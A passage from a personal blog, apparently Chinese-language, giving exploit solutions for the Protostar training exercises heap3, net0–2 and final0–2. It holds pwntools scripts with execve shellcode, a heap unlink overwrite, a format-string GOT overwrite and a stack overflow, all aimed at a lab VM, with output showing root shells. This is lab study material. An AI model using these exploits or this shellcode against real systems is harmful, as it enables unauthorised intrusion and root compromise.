</span><span style="color:#bf616a;">SYS_close</span><span style="color:#c0c5ce;">(3)                                           = </span><span style="color:#bf616a;">0</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">SYS_mmap2</span><span style="color:#c0c5ce;">(0, 4096, 3, 34,</span><span style="color:#bf616a;"> -1</span><span style="color:#c0c5ce;">)                          = </span><span style="color:#bf616a;">0xb7e96000</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">SYS_set_thread_area</span><span style="color:#c0c5ce;">(0xbffffba0, 0xb7ffeff4, 0xb7e966c0, 1, 0) = </span><span style="color:#bf616a;">0</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">SYS_mprotect</span><span style="color:#c0c5ce;">(0xb7fd6000, 8192, 1)                      = </span><span style="color:#bf616a;">0</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">SYS_mprotect</span><span style="color:#c0c5ce;">(0xb7ffe000, 4096, 1)                      = </span><span style="color:#bf616a;">0</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">SYS_munmap</span><span style="color:#c0c5ce;">(0xb7fdc000, 13796)                          = </span><span style="color:#bf616a;">0</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">__libc_start_main</span><span style="color:#c0c5ce;">(0x8048889, 4, 0xbffffd74, 0x804ab50, 0x804ab40 &lt;unfinished ...&gt;</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">sysconf</span><span style="color:#c0c5ce;">(30, 0xb7ffeff4, 0xb7e9abb8, 1, 0xbffffc3c)     = </span><span style="color:#bf616a;">4096</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">sbrk</span><span style="color:#c0c5ce;">(4096 &lt;unfinished ...&gt;</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">SYS_brk</span><span style="color:#c0c5ce;">(NULL)                                          = </span><span style="color:#bf616a;">0x0804c000</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">SYS_brk</span><span style="color:#c0c5ce;">(0x0804d000)                                    = </span><span style="color:#bf616a;">0x0804d000</span><span style="color:#c0c5ce;">
&lt;... </span><span style="color:#bf616a;">sbrk</span><span style="color:#c0c5ce;"> resumed&gt; )                                   = </span><span style="color:#bf616a;">0x0804c000</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">sbrk</span><span style="color:#c0c5ce;">(0)                                                = </span><span style="color:#bf616a;">0x0804d000</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">strcpy</span><span style="color:#c0c5ce;">(0x0804c008, &quot;</span><span style="color:#a3be8c;">aaaa</span><span style="color:#c0c5ce;">&quot;)                             = </span><span style="color:#bf616a;">0x0804c008</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">strcpy</span><span style="color:#c0c5ce;">(0x0804c030, &quot;</span><span style="color:#a3be8c;">aaaa</span><span style="color:#c0c5ce;">&quot;)                             = </span><span style="color:#bf616a;">0x0804c030</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">strcpy</span><span style="color:#c0c5ce;">(0x0804c058, &quot;</span><span style="color:#a3be8c;">aaaa</span><span style="color:#c0c5ce;">&quot;)                             = </span><span style="color:#bf616a;">0x0804c058</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">puts</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">dynamite failed?</span><span style="color:#c0c5ce;">&quot; &lt;unfinished ...&gt;</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">SYS_fstat64</span><span style="color:#c0c5ce;">(1, 0xbffffb98, 0xb7fd7ff4, 0xb7fd84c0, 0x804ac27) = </span><span style="color:#bf616a;">0</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">SYS_mmap2</span><span style="color:#c0c5ce;">(0, 4096, 3, 34,</span><span style="color:#bf616a;"> -1</span><span style="color:#c0c5ce;">)                          = </span><span style="color:#bf616a;">0xb7fdf000</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">SYS_write</span><span style="color:#c0c5ce;">(1, &quot;</span><span style="color:#a3be8c;">dynamite failed?\n</span><span style="color:#c0c5ce;">&quot;, 17dynamite failed?</span><span style="color:#c0c5ce;">
)                 = </span><span style="color:#bf616a;">17</span><span style="color:#c0c5ce;">
&lt;... </span><span style="color:#bf616a;">puts</span><span style="color:#c0c5ce;"> resumed&gt; )                                   = </span><span style="color:#bf616a;">17</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">SYS_exit_group</span><span style="color:#c0c5ce;">(17 &lt;no return ...&gt;</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">+++</span><span style="color:#c0c5ce;"> exited (status 17) </span><span style="color:#bf616a;">+++</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">$</span><span style="color:#c0c5ce;"> objdump</span><span style="color:#bf616a;"> -tTR</span><span style="color:#c0c5ce;"> heap3 | </span><span style="color:#bf616a;">grep</span><span style="color:#c0c5ce;"> winner</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">08048864</span><span style="color:#c0c5ce;"> g     F .text  00000025              winner</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">$</span><span style="color:#c0c5ce;"> objdump</span><span style="color:#bf616a;"> -tTR</span><span style="color:#c0c5ce;"> heap3 | </span><span style="color:#bf616a;">grep</span><span style="color:#c0c5ce;"> puts</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">00000000</span><span style="color:#c0c5ce;">       F *UND*  00000000              puts@@GLIBC_2.0</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">00000000</span><span style="color:#c0c5ce;">      DF *UND*  00000000  GLIBC_2.0   puts</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">0804b128</span><span style="color:#c0c5ce;"> R_386_JUMP_SLOT   puts</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">$</span><span style="color:#c0c5ce;"> ./heap3 `</span><span style="color:#bf616a;">python -c </span><span style="color:#c0c5ce;">&#39;</span><span style="color:#a3be8c;">print &quot;\x90&quot;*14 + &quot;\x68\x64\x88\x04\x08\xc3&quot; + &quot;A&quot;*12 + &quot;\xf8\xff\xff\xff&quot; + &quot;\xfc\xff\xff\xff&quot;</span><span style="color:#c0c5ce;">&#39;` `</span><span style="color:#bf616a;">python -c </span><span style="color:#c0c5ce;">&#39;</span><span style="color:#a3be8c;">print &quot;\xde\xad\xbe\xef&quot;*2+&quot;\x1c\xb1\x04\x08&quot;+&quot;\x08\xc0\x04\x08&quot;</span><span style="color:#c0c5ce;">&#39;` C</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">that</span><span style="color:#c0c5ce;"> wasn&#39;</span><span style="color:#a3be8c;">t too bad now, was it? @ 1532745821</span><span style="color:#a3be8c;">
</span></code></pre><h2 id="xue-xi-zi-liao">学习资料</h2>
<p><a href="http://turingh.github.io/2015/12/12/%E5%9B%BE%E8%A7%A3dwordshoot/">图解DWORDSHOOT</a></p>
<p><a href="http://turingh.github.io/2015/12/14/protostar-heap3/">protostar详细解析 heap3-通过heap3理解堆腐坏的原理及利用方法</a></p>
<h1 id="net-0">Net 0</h1>
<pre style="background-color:#2b303b;">
<code><span style="color:#b48ead;">from </span><span style="color:#c0c5ce;">pwn </span><span style="color:#b48ead;">import </span><span style="color:#d08770;">*</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">
r = </span><span style="color:#bf616a;">remote</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">192.168.116.137</span><span style="color:#c0c5ce;">&quot;, </span><span style="color:#d08770;">2999</span><span style="color:#c0c5ce;">)</span><span style="color:#c0c5ce;">
s = r.</span><span style="color:#bf616a;">recv</span><span style="color:#c0c5ce;">()</span><span style="color:#c0c5ce;">
pos = s.</span><span style="color:#bf616a;">find</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#96b5b4;">\&#39;</span><span style="color:#c0c5ce;">&quot;, </span><span style="color:#d08770;">13</span><span style="color:#c0c5ce;">)</span><span style="color:#c0c5ce;">
num = </span><span style="color:#bf616a;">int</span><span style="color:#c0c5ce;">(s[</span><span style="color:#d08770;">13</span><span style="color:#c0c5ce;">:pos])</span><span style="color:#c0c5ce;">
r.</span><span style="color:#bf616a;">sendline</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">p32</span><span style="color:#c0c5ce;">(num))</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">print </span><span style="color:#c0c5ce;">r.</span><span style="color:#bf616a;">recv</span><span style="color:#c0c5ce;">()</span><span style="color:#c0c5ce;">
</span></code></pre><h1 id="net-1">Net 1</h1>
<pre style="background-color:#2b303b;">
<code><span style="color:#b48ead;">from </span><span style="color:#c0c5ce;">pwn </span><span style="color:#b48ead;">import </span><span style="color:#d08770;">*</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">import </span><span style="color:#c0c5ce;">struct</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">
r = </span><span style="color:#bf616a;">remote</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">192.168.116.137</span><span style="color:#c0c5ce;">&quot;, </span><span style="color:#d08770;">2998</span><span style="color:#c0c5ce;">)</span><span style="color:#c0c5ce;">
s = r.</span><span style="color:#bf616a;">recv</span><span style="color:#c0c5ce;">()</span><span style="color:#c0c5ce;">
</span><span style="color:#65737e;"># print s</span><span style="color:#65737e;">
</span><span style="color:#c0c5ce;">num = struct.</span><span style="color:#bf616a;">unpack</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">I</span><span style="color:#c0c5ce;">&quot;, s)</span><span style="color:#c0c5ce;">
</span><span style="color:#65737e;"># print num</span><span style="color:#65737e;">
</span><span style="color:#c0c5ce;">r.</span><span style="color:#bf616a;">sendline</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">str</span><span style="color:#c0c5ce;">(num[</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">]))</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">print </span><span style="color:#c0c5ce;">r.</span><span style="color:#bf616a;">recv</span><span style="color:#c0c5ce;">()</span><span style="color:#c0c5ce;">
</span></code></pre><h1 id="net-2">Net 2</h1>
<pre style="background-color:#2b303b;">
<code><span style="color:#b48ead;">from </span><span style="color:#c0c5ce;">pwn </span><span style="color:#b48ead;">import </span><span style="color:#d08770;">*</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">import </span><span style="color:#c0c5ce;">struct</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">
r = </span><span style="color:#bf616a;">remote</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">192.168.116.137</span><span style="color:#c0c5ce;">&quot;, </span><span style="color:#d08770;">2997</span><span style="color:#c0c5ce;">)</span><span style="color:#c0c5ce;">
num = </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">for </span><span style="color:#c0c5ce;">i </span><span style="color:#b48ead;">in </span><span style="color:#96b5b4;">range</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">4</span><span style="color:#c0c5ce;">):</span><span style="color:#c0c5ce;">
  s = r.</span><span style="color:#bf616a;">recv</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">4</span><span style="color:#c0c5ce;">)</span><span style="color:#c0c5ce;">
  num += </span><span style="color:#bf616a;">int</span><span style="color:#c0c5ce;">(struct.</span><span style="color:#bf616a;">unpack</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">&lt;I</span><span style="color:#c0c5ce;">&quot;, s)[</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">])</span><span style="color:#c0c5ce;">
num &amp;= </span><span style="color:#d08770;">0xffffffff</span><span style="color:#c0c5ce;">
r.</span><span style="color:#bf616a;">sendline</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">p32</span><span style="color:#c0c5ce;">(num))</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">print </span><span style="color:#c0c5ce;">r.</span><span style="color:#bf616a;">recv</span><span style="color:#c0c5ce;">()</span><span style="color:#c0c5ce;">
</span></code></pre><h1 id="final-0">Final 0</h1>
<p>首先用栈溢出获得core file，然后objdump获得buffer起始地址，因为gets对\x00读取并没问题，直接用\x00截断，shellcode，junk，retaddr</p>
<pre style="background-color:#2b303b;">
<code><span style="color:#b48ead;">from </span><span style="color:#c0c5ce;">pwn </span><span style="color:#b48ead;">import </span><span style="color:#d08770;">*</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">import </span><span style="color:#c0c5ce;">struct</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">
r = </span><span style="color:#bf616a;">remote</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">192.168.116.137</span><span style="color:#c0c5ce;">&quot;, </span><span style="color:#d08770;">2995</span><span style="color:#c0c5ce;">)</span><span style="color:#c0c5ce;">
shellcode = &#39;</span><span style="color:#96b5b4;">\xb8\x2f\x73\x68\xf0\x25\xff\xff\xff\x0f\x50\xb8\x2f\x62\x69\x6e\x50\x89\xe3\x31\xc0\xb0\x0b\x31\xc9\x31\xd2\xcd\x80</span><span style="color:#c0c5ce;">&#39;</span><span style="color:#c0c5ce;">
payload = &#39;</span><span style="color:#96b5b4;">\x00</span><span style="color:#c0c5ce;">&#39;+ shellcode + &#39;</span><span style="color:#96b5b4;">\x90</span><span style="color:#c0c5ce;">&#39;*(</span><span style="color:#d08770;">532</span><span style="color:#c0c5ce;">-</span><span style="color:#96b5b4;">len</span><span style="color:#c0c5ce;">(shellcode)-</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">)+</span><span style="color:#bf616a;">p32</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">0xbffffa49</span><span style="color:#c0c5ce;">)</span><span style="color:#c0c5ce;">
r.</span><span style="color:#bf616a;">sendline</span><span style="color:#c0c5ce;">(payload)</span><span style="color:#c0c5ce;">
r.</span><span style="color:#bf616a;">interactive</span><span style="color:#c0c5ce;">()</span><span style="color:#c0c5ce;">
</span></code></pre><pre style="background-color:#2b303b;">
<code><span style="color:#bf616a;">root@kali:~/Documents/Protostar#</span><span style="color:#c0c5ce;"> python final0.py </span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">[+]</span><span style="color:#c0c5ce;"> Opening connection to 192.168.116.137 on port 2995: Done</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">[*]</span><span style="color:#c0c5ce;"> Switching to interactive mode</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">$</span><span style="color:#c0c5ce;"> id</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">uid</span><span style="color:#c0c5ce;">=</span><span style="color:#a3be8c;">0</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">root</span><span style="color:#c0c5ce;">) gid=0(root) </span><span style="color:#bf616a;">groups</span><span style="color:#c0c5ce;">=</span><span style="color:#a3be8c;">0</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">root</span><span style="color:#c0c5ce;">)</span><span style="color:#c0c5ce;">
</span></code></pre><h1 id="final-1">Final 1</h1>
<p>syslog原型为<code>void syslog(int priority, const char *format, ...);</code>看第二个参数名字就懂了吧，查看需要在有权限的情况下看<code>/var/log/syslog</code>文件</p>
<p>然后就是尝试咯</p>
<pre style="background-color:#2b303b;">
<code><span style="color:#bf616a;">$</span><span style="color:#c0c5ce;"> objdump</span><span style="color:#bf616a;"> -tTR</span><span style="color:#c0c5ce;"> final1 | </span><span style="color:#bf616a;">grep</span><span style="color:#c0c5ce;"> puts</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">00000000</span><span style="color:#c0c5ce;">       F *UND*  00000000              puts@@GLIBC_2.0</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">00000000</span><span style="color:#c0c5ce;">      DF *UND*  00000000  GLIBC_2.0   puts</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">0804a194</span><span style="color:#c0c5ce;"> R_386_JUMP_SLOT   puts</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">$</span><span style="color:#c0c5ce;"> objdump</span><span style="color:#bf616a;"> -tTR</span><span style="color:#c0c5ce;"> final1 | </span><span style="color:#bf616a;">grep</span><span style="color:#c0c5ce;"> username</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">0804a220</span><span style="color:#c0c5ce;"> g     O .bss   00000080              username</span><span style="color:#c0c5ce;">
</span></code></pre><pre style="background-color:#2b303b;">
<code><span style="color:#b48ead;">from </span><span style="color:#c0c5ce;">pwn </span><span style="color:#b48ead;">import </span><span style="color:#d08770;">*</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">import </span><span style="color:#c0c5ce;">struct</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">
shellcode = &#39;</span><span style="color:#96b5b4;">\xb8\x2f\x73\x68\xf0\x25\xff\xff\xff\x0f\x50\xb8\x2f\x62\x69\x6e\x50\x89\xe3\x31\xc0\xb0\x0b\x31\xc9\x31\xd2\xcd\x80</span><span style="color:#c0c5ce;">&#39;</span><span style="color:#c0c5ce;">
ret = </span><span style="color:#d08770;">0x0804a194</span><span style="color:#c0c5ce;">
payload = shellcode+&#39;</span><span style="color:#96b5b4;">\x90</span><span style="color:#c0c5ce;">&#39;*</span><span style="color:#d08770;">2</span><span style="color:#c0c5ce;">+</span><span style="color:#bf616a;">p32</span><span style="color:#c0c5ce;">(ret)+</span><span style="color:#bf616a;">p32</span><span style="color:#c0c5ce;">(ret+</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">)+</span><span style="color:#bf616a;">p32</span><span style="color:#c0c5ce;">(ret+</span><span style="color:#d08770;">2</span><span style="color:#c0c5ce;">)+</span><span style="color:#bf616a;">p32</span><span style="color:#c0c5ce;">(ret+</span><span style="color:#d08770;">3</span><span style="color:#c0c5ce;">)+&#39;</span><span style="color:#a3be8c;">%24$01968d</span><span style="color:#c0c5ce;">&#39;+&#39;</span><span style="color:#a3be8c;">%26$hn</span><span style="color:#c0c5ce;">&#39;+&#39;</span><span style="color:#a3be8c;">%24$039452d</span><span style="color:#c0c5ce;">&#39;+&#39;</span><span style="color:#a3be8c;">%24$hn</span><span style="color:#c0c5ce;">&#39;</span><span style="color:#c0c5ce;">
r = </span><span style="color:#bf616a;">remote</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">192.168.116.137</span><span style="color:#c0c5ce;">&quot;, </span><span style="color:#d08770;">2994</span><span style="color:#c0c5ce;">)</span><span style="color:#c0c5ce;">
r.</span><span style="color:#bf616a;">recv</span><span style="color:#c0c5ce;">()</span><span style="color:#c0c5ce;">
r.</span><span style="color:#bf616a;">sendline</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">username </span><span style="color:#c0c5ce;">&quot;+payload)</span><span style="color:#c0c5ce;">
r.</span><span style="color:#bf616a;">recv</span><span style="color:#c0c5ce;">()</span><span style="color:#c0c5ce;">
r.</span><span style="color:#bf616a;">sendline</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">login </span><span style="color:#c0c5ce;">&quot;+&quot; &quot;*</span><span style="color:#d08770;">24</span><span style="color:#c0c5ce;">)</span><span style="color:#c0c5ce;">
r.</span><span style="color:#bf616a;">interactive</span><span style="color:#c0c5ce;">()</span><span style="color:#c0c5ce;">
</span></code></pre><pre style="background-color:#2b303b;">
<code><span style="color:#bf616a;">root@kali:~/Documents/Protostar#</span><span style="color:#c0c5ce;"> python final1.py </span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">[+]</span><span style="color:#c0c5ce;"> Opening connection to 192.168.116.137 on port 2994: Done</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">[*]</span><span style="color:#c0c5ce;"> Switching to interactive mode</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">$</span><span style="color:#c0c5ce;"> id</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">uid</span><span style="color:#c0c5ce;">=</span><span style="color:#a3be8c;">0</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">root</span><span style="color:#c0c5ce;">) gid=0(root) </span><span style="color:#bf616a;">groups</span><span style="color:#c0c5ce;">=</span><span style="color:#a3be8c;">0</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">root</span><span style="color:#c0c5ce;">)</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">
</span></code></pre><h1 id="final-2">Final 2</h1>
<pre style="background-color:#2b303b;">
<code><span style="color:#b48ead;">from </span><span style="color:#c0c5ce;">pwn </span><span style="color:#b48ead;">import </span><span style="color:#d08770;">*</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">import </span><span style="color:#c0c5ce;">struct</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">
shellcode = &#39;</span><span style="color:#96b5b4;">\xb8\x2f\x73\x68\xf0\x25\xff\xff\xff\x0f\x50\xb8\x2f\x62\x69\x6e\x50\x89\xe3\x31\xc0\xb0\x0b\x31\xc9\x31\xd2\xcd\x80</span><span style="color:#c0c5ce;">&#39;</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">
r = </span><span style="color:#bf616a;">remote</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">192.168.116.137</span><span style="color:#c0c5ce;">&quot;, </span><span style="color:#d08770;">2993</span><span style="color:#c0c5ce;">)</span><span style="color:#c0c5ce;">
r.</span><span style="color:#bf616a;">send</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">FSRD</span><span style="color:#c0c5ce;">&quot; + &quot;</span><span style="color:#a3be8c;">A</span><span style="color:#c0c5ce;">&quot;*(</span><span style="color:#d08770;">128</span><span style="color:#c0c5ce;">-</span><span style="color:#d08770;">4</span><span style="color:#c0c5ce;">-</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">) + &quot;</span><span style="color:#a3be8c;">/</span><span style="color:#c0c5ce;">&quot;)  </span><span style="color:#c0c5ce;">
r.</span><span style="color:#bf616a;">sendline</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">FSRD</span><span style="color:#c0c5ce;">&quot; + &quot;</span><span style="color:#a3be8c;">ROOT</span><span style="color:#c0c5ce;">&quot; + &quot;</span><span style="color:#96b5b4;">\x90</span><span style="color:#c0c5ce;">&quot;*(</span><span style="color:#d08770;">128</span><span style="color:#c0c5ce;">-</span><span style="color:#96b5b4;">len</span><span style="color:#c0c5ce;">(shellcode)-</span><span style="color:#d08770;">4</span><span style="color:#c0c5ce;">-</span><span style="color:#d08770;">4</span><span style="color:#c0c5ce;">-</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">-</span><span style="color:#d08770;">4</span><span style="color:#c0c5ce;">-</span><span style="color:#d08770;">4</span><span style="color:#c0c5ce;">-</span><span style="color:#d08770;">4</span><span style="color:#c0c5ce;">-</span><span style="color:#d08770;">4</span><span style="color:#c0c5ce;">) + shellcode + &quot;</span><span style="color:#a3be8c;">/</span><span style="color:#c0c5ce;">&quot; + &quot;</span><span style="color:#96b5b4;">\xfc\xff\xff\xff</span><span style="color:#c0c5ce;">&quot; + &quot;</span><span style="color:#96b5b4;">\xfc\xff\xff\xff</span><span style="color:#c0c5ce;">&quot; + &quot;</span><span style="color:#96b5b4;">\x10\xd4\x04\x08</span><span style="color:#c0c5ce;">&quot; + &quot;</span><span style="color:#96b5b4;">\x98\xe0\x04\x08</span><span style="color:#c0c5ce;">&quot; )</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">
r.</span><span style="color:#bf616a;">interactive</span><span style="color:#c0c5ce;">()</span><span style="color:#c0c5ce;">
</span></code></pre><pre style="background-color:#2b303b;">
<code><span style="color:#bf616a;">root@kali:~/Documents/Protostar#</span><span style="color:#c0c5ce;"> python final2.py </span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">[+]</span><span style="color:#c0c5ce;"> Opening connection to 192.168.116.137 on port 2993: Done</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">[*]</span><span style="color:#c0c5ce;"> Switching to interactive mode</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">Process</span><span style="color:#c0c5ce;"> OK</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">$</span><span style="color:#c0c5ce;"> id</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">uid</span><span style="color:#c0c5ce;">=</span><span style="color:#a3be8c;">0</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">root</span><span style="color:#c0c5ce;">) gid=0(root) </span><span style="color:#bf616a;">groups</span><span style="color:#c0c5ce;">=</span><span style="color:#a3be8c;">0</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">root</span><span style="color:#c0c5ce;">)</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">
</span></code></pre>
  </div>

        </div>

        
          <button class="sidebar-toggle" onclick="openSidebar()">O</button>
          <aside class="sidebar" name="sidebar">
            <div class="site-author" itemprop="author" itemtype="https://schema.org/Person">
              
              <img class="site-author-image" itemprop="image"
                src="https:&#x2F;&#x2F;CSUwangj.github.io&#x2F;img&#x2F;avatar.png"
                alt="CSUwangj" />
              
              <p class="site-author-name">CSUwangj</p>
              <p class="site-author-quote">Just keep in mind that hacking is very rarely in a sequence.</p>
            </div>
            <div class="feed-link">
              
                <a rel="alternate" type="application/atom+xml" title="RSS" href="https://CSUwangj.github.io/atom.xml">
                  RSS
                </a>
              
            </div>
            <div class="links-of-author">
              
                <a href="https:&#x2F;&#x2F;github.com&#x2F;CSUwangj" title="Github" class="author-link">
                  <i class="fa fw fa-github"></i>
                </a>
              
            </div>
            <div class="links-of-blogroll">
              
                <a href="https:&#x2F;&#x2F;zickshen.github.io&#x2F;">zickshen</a>
              
            </div>
          </aside>
        

      </main>

      
        <footer name="footer">
          <div class="copyright">
            <span item="copyrightYear">© 2018-2020</span>
            <span class="author">CSUwangj</span>
          </div>
          <div class="powered-by">
            Powered by <a href="https://www.getzola.org/">Zola</a> Theme <a href="https://github.com/CSUwangj/DogFood">DogFood</a>
          </div>
        </footer>
      
    </body>

</html>